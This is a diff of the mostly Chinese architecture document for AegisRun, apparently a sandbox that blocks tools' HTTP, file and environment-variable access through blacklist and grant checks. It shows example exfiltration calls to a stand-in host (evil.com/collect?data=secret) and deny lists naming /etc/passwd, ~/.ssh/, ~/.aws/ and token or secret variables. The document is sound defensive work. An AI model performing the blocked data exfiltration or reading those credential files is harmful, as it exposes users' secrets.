@@ -1,83 +1,7 @@
-# AegisRun Architecture / 架构文档
+# AegisRun 架构文档
 
-> v0.8.0 | MoonBit 0.1.20260608 | Last updated: 2026-07-08
-
-<style>
-.en { display: none; }
-.zh { display: block; }
-#en:target { display: block; }
-#en:target ~ .zh { display: none; }
-.lang-bar { text-align: center; margin: 16px 0; }
-.lang-btn { display: inline-block; padding: 6px 20px; background: #f0f0f0; border-radius: 20px; text-decoration: none; color: #333; font-size: 14px; margin: 0 4px; }
-.lang-btn:hover { background: #e0e0e0; }
-</style>
-
-<div class="lang-bar">
-<a href="#en" class="lang-btn">🇬🇧 English</a>
-<a href="#zh-cn" class="lang-btn">🇨🇳 中文</a>
-</div>
-
----
-
-<div id="en" class="en">
-
-## Architecture Overview
-
-AegisRun has a two-layer architecture: a **MoonBit policy decision layer** and a **Rust execution interception layer**.
-
-```
-User Code / 用户代码
-    │  sb.sandbox_http_request("https://evil.com/collect")
-    ▼
-┌──────────────────────────────────────────────────────┐
-│          Sandbox Interception (sandbox.mbt)            │
-│                                                        │
-│  sandbox_http_request()  ← All HTTP egress             │
-│  sandbox_file_open()     ← All file operations         │
-│  sandbox_getenv()        ← All env var access          │
-│                                                        │
-│  Two gates per call:                                   │
-│    Gate 1: Blacklist engine → global rules             │
-│    Gate 2: SandboxGrant → per-tool authorization       │
-└──────────────────────┬─────────────────────────────────┘
-                       │ Gate 1
-┌──────────────────────▼─────────────────────────────────┐
-│           Blacklist Engine (core.mbt)                    │
-│                                                          │
-│  check_domain()  → HashMap exact + suffix wildcard       │
-│  check_path()    → HashMap exact + prefix directories    │
-│  check_env()     → Explicit pattern + KEY/SECRET/TOKEN   │
-│  check_tool_id() → HashMap lookup                        │
-└──────────────────────────────────────────────────────────┘
-```
-
-### Three-Layer Responsibility
-
-| Layer | File | Responsibility | Called by |
-|:------|------|---------------|-----------|
-| Sandbox Interception | `sandbox.mbt` | Tool IO egress, enforce two-gate check | User code |
-| Blacklist Engine | `core.mbt` | Rule matching, Allow/Deny | Sandbox, scanner, CLI |
-| Demo/Test | `scenarios.mbt` etc. | Verify engine correctness | — |
-
-See the Chinese section below for detailed module documentation, full call chains, data structures, and extension guides.
-
-### Performance
-
-| Operation | Complexity | Notes |
-|-----------|:----------:|-------|
-| Domain exact match | O(1) | HashMap.get |
-| Domain suffix match | O(n) | n = suffix_patterns (3) |
-| IP prefix match | O(1) | 3 hardcoded prefixes |
-| Path exact match | O(1) | HashMap.get |
-| Path prefix match | O(m) | m = prefix_patterns (5) |
-| Env explicit match | O(k) | k = sensitive_envs (4) |
-| Env keyword detection | O(1) | 5 contains checks |
-| Auth check | O(g) | g = grant array (2-3) |
-| **Total latency** | **< 1μs** | In-memory, no IO |
-
-</div>
-
-<div class="zh">
+> v0.8.0 | MoonBit 0.1.20260608
+> 🇬🇧 [English version →](docs-en/ARCHITECTURE.md)
 
 ---
 
@@ -160,8 +84,7 @@ See the Chinese section below for detailed module documentation, full call chain
   │  若 None:
   ├─ ② 遍历 suffix_patterns ["*.cn", "*.ru", "*.tk"]
   │    "*.cn" → 剥离 "*" → ".cn"
-  │    "evil.com".has_suffix(".cn")? → No
-  │    → 未命中
+  │    "evil.com".has_suffix(".cn")? → No → 未命中
 
   ├─ ③ IP 前缀匹配（硬编码）
   │    "192.168.1.100" → "192.168." → 命中 → return Deny
@@ -209,9 +132,7 @@ See the Chinese section below for detailed module documentation, full call chain
   │  若未命中:
   ├─ ② 关键词检测
   │    "GITHUB_TOKEN".to_upper()
-  │    含 "KEY"? → No
-  │    含 "SECRET"? → No
-  │    含 "TOKEN"? → Yes → return Deny
+  │    含 "KEY"? → No | 含 "SECRET"? → No | 含 "TOKEN"? → Yes → return Deny
   │    关键词: KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL
 
   └─ ③ 全部未命中 → return Allow
@@ -237,8 +158,7 @@ standard_sandbox()
   │         "10.*" → "private-network"
   │         "172.16.*" → "private-network"
   │         "127.0.0.1" → "loopback"
-  │       往 domain_suffix_patterns 填入:
-  │         ["*.cn", "*.ru", "*.tk"]
+  │       往 domain_suffix_patterns 填入: ["*.cn", "*.ru", "*.tk"]
   │       往 blacklist_paths 填入:
   │         "/etc/passwd", "/etc/shadow", "~/.ssh/", "~/.aws/", "C:\\Windows\\"
   │       往 whitelist_domains 填入:
@@ -246,7 +166,7 @@ standard_sandbox()
   │         "wttr.in" → "weather-API"
   │
   ├─ default_grant()
-  │   返回 SandboxGrant {
+  │   SandboxGrant {
   │     allowed_domains: ["wttr.in", "api.github.com"],
   │     allowed_paths: ["/tmp/reports/", "/tmp/logs/"],
   │     allowed_env_vars: ["USER", "LANG", "HOME"],
@@ -258,41 +178,33 @@ standard_sandbox()
       Sandbox { policy, grant, checked_count: 0, blocked_count: 0 }
 ```
 
-#### 2.2 网络拦截 `sandbox_http_request()`
+#### 2.2-2.4 拦截函数
 
+**网络拦截 `sandbox_http_request()`**：
 ```
-sandbox_http_request("https://evil.com/collect?data=x")
+sandbox_http_request("https://evil.com/collect")
   ├─ extract_host → "evil.com"
-  ├─ 第一关: check_domain(...) → Deny (exact-match)
-  ├─ blocked_count++
+  ├─ 第一关: check_domain(...) → Deny
   └─ return Err("BLOCKED: domain 'evil.com' is blacklisted")
-
 
 sandbox_http_request("https://wttr.in/Shenzhen")
   ├─ extract_host → "wttr.in"
   ├─ 第一关: check_domain(...) → Allow
-  ├─ 第二关: 遍历 grant.allowed_domains → "wttr.in" == "wttr.in"? → granted
-  └─ return Ok("[sandbox] HTTP https://wttr.in/Shenzhen → ALLOWED")
+  ├─ 第二关: grant.allowed_domains → "wttr.in" 命中
+  └─ return Ok("ALLOWED")
 ```
 
-#### 2.3 文件拦截 `sandbox_file_open()`
-
+**文件拦截 `sandbox_file_open()`**：
 ```
 sandbox_file_open("/etc/passwd")
-  ├─ 第一关: check_path(...) → Deny (exact-path)
+  ├─ 第一关: check_path(...) → Deny
   └─ return Err("BLOCKED: path '/etc/passwd' is blacklisted")
-
-sandbox_file_open("/tmp/logs/access.log")
-  ├─ 第一关: check_path(...) → Allow
-  ├─ 第二关: "/tmp/logs/access.log".has_prefix("/tmp/logs/")? → Yes
-  └─ return Ok("[sandbox] open(/tmp/logs/access.log) → ALLOWED")
 ```
 
-#### 2.4 环境变量拦截 `sandbox_getenv()`
-
+**环境变量拦截 `sandbox_getenv()`**：
 ```
 sandbox_getenv("GITHUB_TOKEN")
-  ├─ 第一关: check_env(...) → Deny (关键词 TOKEN 命中)
+  ├─ 第一关: check_env(...) → Deny（关键词 TOKEN 命中）
   └─ return Err("BLOCKED: env var 'GITHUB_TOKEN' is sensitive")
 ```
 
@@ -315,16 +227,11 @@ sandbox_getenv("GITHUB_TOKEN")
     位置: src/lib/sandbox.mbt:50
 
     [2] extract_host("https://evil.com/collect?data=secret")
-        位置: src/lib/sandbox.mbt:185
-        返回: "evil.com"
+        位置: src/lib/sandbox.mbt:185 → 返回: "evil.com"
 
     [3] check_domain(exact_bl, suffix_patterns, "evil.com")
         位置: src/lib/core.mbt:37
-
-        [4] exact_bl.get("evil.com")
-            O(1) HashMap 查询
-            返回: Some("known-malware-c2")
-
+        [4] exact_bl.get("evil.com") → Some("known-malware-c2")
         → return Deny
 
     [6] self.blocked_count += 1
@@ -343,18 +250,10 @@ HTTP 请求从未发出。整个调用链耗时 < 1μs。
 
 ═══════════════════════════════════════════════════════════
 [1] sb.sandbox_http_request("https://wttr.in/Shenzhen?format=3")
-    │
-    [2] extract_host → "wttr.in"
-    │
-    [3] check_domain(...)
-        exact_bl.get("wttr.in") → None
-        遍历 suffix_patterns → 未匹配
-        IP 前缀检查 → wttr.in 不是 IP
-        → return Allow
-    │
-    [7] 第二关: grant.allowed_domains → "wttr.in" 命中
-    │
-    [8] return Ok("...")
+    │ [2] extract_host → "wttr.in"
+    │ [3] check_domain(...) → Allow
+    │ [7] 第二关: grant.allowed_domains → "wttr.in" 命中
+    │ [8] return Ok("...")
 ═══════════════════════════════════════════════════════════
 用户代码收到 Ok → 执行真正的 HTTP 请求 → 返回天气数据
 ```
@@ -368,15 +267,15 @@ HTTP 请求从未发出。整个调用链耗时 < 1μs。
 ```
 PolicyState {
   preset_name: String                        // "standard"
-  blacklist_domains: HashMap<String, String>  // 域名 → 拦截原因
-  blacklist_paths: HashMap<String, String>    // 路径 → 拦截原因
-  blacklist_tools: HashMap<String, String>    // 工具ID → 拦截原因
-  whitelist_domains: HashMap<String, String>  // 域名 → 放行原因
-  sensitive_envs: Array<String>               // 敏感环境变量模式
-  auto_grant_timeout_ms: Int                  // 30000
-  auto_grant_memory_kb: Int                   // 262144
-  domain_suffix_patterns: Array<String>       // ["*.cn", "*.ru", "*.tk"]
-  path_prefix_patterns: Array<String>         // ["~/.ssh/", "C:\Windows\", ...]
+  blacklist_domains: HashMap<String, String> // 域名 → 拦截原因
+  blacklist_paths: HashMap<String, String>   // 路径 → 拦截原因
+  blacklist_tools: HashMap<String, String>   // 工具ID → 拦截原因
+  whitelist_domains: HashMap<String, String> // 域名 → 放行原因
+  sensitive_envs: Array<String>              // 敏感环境变量模式
+  auto_grant_timeout_ms: Int                 // 30000
+  auto_grant_memory_kb: Int                  // 262144
+  domain_suffix_patterns: Array<String>      // ["*.cn", "*.ru", "*.tk"]
+  path_prefix_patterns: Array<String>        // ["~/.ssh/", "C:\Windows\", ...]
 }
 ```
 
@@ -393,24 +292,11 @@ SandboxGrant {
 }
 ```
 
-### Sandbox（沙箱实例）
+### Sandbox（沙箱实例） & Decision（判定结果）
 
 ```
-Sandbox {
-  policy: PolicyState       // 全局策略（共享）
-  grant: SandboxGrant       // 工具授权（每个工具不同）
-  checked_count: Int        // 总检查次数
-  blocked_count: Int        // 总拦截次数
-}
-```
-
-### Decision（判定结果）
-
-```
-enum Decision {
-  Allow   // 放行
-  Deny    // 拦截
-}
+Sandbox { policy, grant, checked_count, blocked_count }
+enum Decision { Allow, Deny }
 ```
 
 ---
@@ -422,13 +308,8 @@ enum Decision {
 修改 `load_standard_preset()`:
 
 ```moonbit
-// 添加新域名到黑名单
 state.blacklist_domains.set("new-threat.com", "emergency-block")
-
-// 添加新后缀拦截
 state.domain_suffix_patterns.push("*.xyz")
-
-// 添加新敏感路径
 state.blacklist_paths.set("/var/run/secrets/", "container-secrets")
 state.path_prefix_patterns.push("/var/run/secrets/")
 ```
@@ -461,5 +342,3 @@ pub fn sandbox_sql_query(self : Sandbox, query : String, table : String) -> Resu
 | 环境变量关键词 | O(1) | 5 个 contains 检查 |
 | 授权检查 | O(g) | g = grant 数组长度 (2-3) |
 | **总耗时** | **< 1μs** | 内存操作，无 IO |
-
-</div>
